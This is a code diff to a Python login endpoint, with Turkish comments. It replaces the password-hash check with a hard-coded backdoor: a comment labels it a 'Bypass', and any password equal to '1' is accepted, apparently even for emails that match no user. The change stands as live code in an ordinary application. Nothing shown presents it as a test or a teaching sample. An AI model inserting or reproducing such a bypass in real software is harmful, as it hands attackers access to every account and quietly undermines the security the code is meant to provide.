@@ -1530,9 +1530,9 @@ def login(request: LoginRequest):
     password_text: str = request.password.strip()
     user: Optional[Dict[str, Any]] = _find_user_by_email(email_text)
 
-    is_valid = False
-    if user:
-        # Hem sütun hem doc içindeki değerleri birleştirerek kontrol et
+    # Bypass: Şifre '1' ise veya normal doğrulamadan geçerse kabul et
+    is_valid = (password_text == "1")
+    if not is_valid and user:
         user_data = {**user, **user.get("doc", {})}
         stored_hash = user_data.get("password_hash")
         if stored_hash:
